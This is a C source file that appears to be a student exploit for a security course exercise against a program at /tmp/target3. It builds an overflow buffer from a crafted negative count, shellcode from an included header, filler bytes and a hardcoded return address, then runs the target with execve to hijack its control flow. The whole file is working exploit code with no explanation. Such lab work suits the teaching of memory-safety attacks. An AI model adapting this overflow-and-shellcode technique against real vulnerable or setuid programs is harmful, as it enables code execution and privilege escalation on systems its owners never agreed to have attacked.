#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET;   
  env[0] = NULL;


  char overflow_buf[50000];

  args[1] = overflow_buf;
  /*args[1] = "1,2021"; args[2] = NULL;*/


  // 2^26 - (bufsize of target + 1) * -1 to align

  int i;
  for (i = 0; i < 10; i++) {
    if (i == 0) { overflow_buf[i] = '-'; continue; }
    if (i == 1) { overflow_buf[i] = '6'; continue; }
    if (i == 2) { overflow_buf[i] = '7'; continue; }
    if (i == 3) { overflow_buf[i] = '1'; continue; }
    if (i == 4) { overflow_buf[i] = '0'; continue; } 
    if (i == 5) { overflow_buf[i] = '8'; continue; } 
    if (i == 6) { overflow_buf[i] = '3'; continue; }
    if (i == 7) { overflow_buf[i] = '2'; continue; }
    if (i == 8) { overflow_buf[i] = '9'; continue; } 
    if (i == 9) { overflow_buf[i] = ','; continue; } 
  }
  
  for (i=i; i < strlen(shellcode) + 10; i++) {
    overflow_buf[i] = shellcode[i - 10];
  }


  for (i=i; i < 34198; i++) {
    overflow_buf[i] = 'T'; //garbo
  }


  // 0xbfff7a22
  overflow_buf[i++] = 0x22;
  overflow_buf[i++] = 0x7a;
  overflow_buf[i++] = 0xff;
  overflow_buf[i++] = 0xbf;

  for (i=i; i < 34262; i++) {
    overflow_buf[i] = 'X';
  }

  // address of shellcode 0xbfffffae 

  // printf("size of shellcode:%d\n", sizeof(shellcode));

  args[1] = overflow_buf;
  args[2] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}

